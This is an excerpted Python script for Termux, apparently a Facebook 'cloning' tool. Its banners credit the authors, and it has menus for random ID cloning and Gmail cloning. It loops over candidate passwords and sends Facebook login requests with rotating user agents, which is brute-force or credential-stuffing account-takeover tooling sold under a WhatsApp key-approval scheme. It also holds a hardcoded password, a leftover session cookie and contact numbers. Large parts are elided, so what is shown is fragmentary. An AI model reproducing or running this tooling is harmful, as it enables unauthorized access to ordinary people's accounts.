...
#User Agnes buatan Asep Yusup 
    rr = random.randint
    rc = random.choice
    satu = f"Mozilla/5.0 (Linux; Android 9; itel L6005) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.20 Mobile Safari/537.36 OPR/64.2.3282.60128"
    ...
    empat  = f"Mozilla/5.0 (Linux; Android 4.4.2; Nexus 4 Build/KOT49H) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/34.0.1847.114 Mobile Safari/537.36"
...
def banner():
  ...
  {H}  ║{P}[{H}•{P}] Facebook  : {H} WB TERMUX TOOLS      {N}{H}     ║
    {H}║{P}[{H}•{P}] Whatsapp  : {M}+8801*********.           {N}{H}       ║
  {H}  ║{P}[{H}•{P}] Github    : {K}{N}.  {H}  ║
...
def main():
    stored_password = "579078"  # Replace this with your desired password
...
os.system('espeak -a 300 " WELCOME TO ibrahim AND Resma TOOL"')
...
print(f"""   \033[32;1m 
  ...
  \033[91;1m  ╔════════════════════════════════════════╗
   {H} ║{P}[{H}•{P}] Author    :{M} WB KING         {N}{H}    ║
  {H}  ║{P}[{H}•{P}] Facebook  : {H}facebook.com/61550292375815    {N}{H}║
    {H}║{P}[{H}•{P}] Whatsapp  : {M}+8801*********.           {N}{H}║
  {H}  ║{P}[{H}•{P}] Status    : {H}PREMIUM {P}     {N}      {H}    ║
   {H} ║{P}[{H}•{P}] Network   : {H}3G{N}, {H}4G/5G{N}, {H}ON{N}     {H}      ║
...
def mainx():
    ...
    print(f"{K} [{H}1{K}] {GREEN}File   Cloning ")
    print(f"{K} [{H}2{K}] {GREEN}Random Cloning {H}more..7+")
    print(f'{K} [{H}3{K}] {GREEN}Separate Ids ')
    print(f'{K} [{H}4{K}] {GREEN}Remove Duplicate Ids')
    ...
    if mahin in ["1","01"]:
     ...
     os.system("xdg-open https://www.facebook.com/profile.php?id=100079999129988?mibextid=ZbWKwL");mainx()
    elif mahin in ["0","00"]:
...
def mainx2():
    os.system("clear")
    banner()
    print(f"{K} [{H}1{K}] {GREEN}Random Cloning {H}6 Digit")
    print(f"{K} [{H}2{K}] {GREEN}Random Cloning {H}7 Digit ")
    print(f"{K} [{H}3{K}] {GREEN}Random Cloning {H}8 Digit ")
    print(f"{K} [{H}4{K}] {GREEN}Random Cloning {H}Pak/Ind")
    print(f"{K} [{H}5{K}] {GREEN}Gmail  Cloning {H}V1")
    print(f"{K} [{H}6{K}] {GREEN}Gmail  Cloning {H}V2")
...
def gf1(): 
    ...
    tkk = first+last
    banner();print(f"{dot}{P}Gmail Ids {GREEN}: {tkk[:4]}****{domain}");print(led);print(f' {K}[{H}1{K}] {P}Method [{H}M1{P}]');print(f' {K}[{H}2{K}] {P}Method [{H}M2{P}]');print(f' {K}[{H}3{K}] {P}Method [{H}M3{P}]')
 ...
 try:
  for ps in pw:
   ...
   headers = { 'authority': 'www.facebook.com',
    ...
    # 'cookie': 'sb=aKbTZBVbPicaWvgRnDNx8iws; datr=bKbTZAozuuIdCpE27u2CqutB; wd=392x641; fr=0V9Y5TgO1Hx6VfJ2Q.AWUEcNBEGTb3REob8xYexntBVAQ.Bk06Zo.zj.AAA.0.0.Bk33qS.AWVRegmU6Pg',
    'dpr': '1',
...
def approval():
  ...
  try:
    ...
    if id in httpCaht:
      ...
      tks = ('Hello%20MR%20Sir%20!%20Please%20Approve%20My%20The%20MR%20Key%20:%20'+id);os.system('am start https://wa.me/+8801611590876?text='+tks),approval()
      time.sleep(1)
      approval()
  except:
    sys.exit()
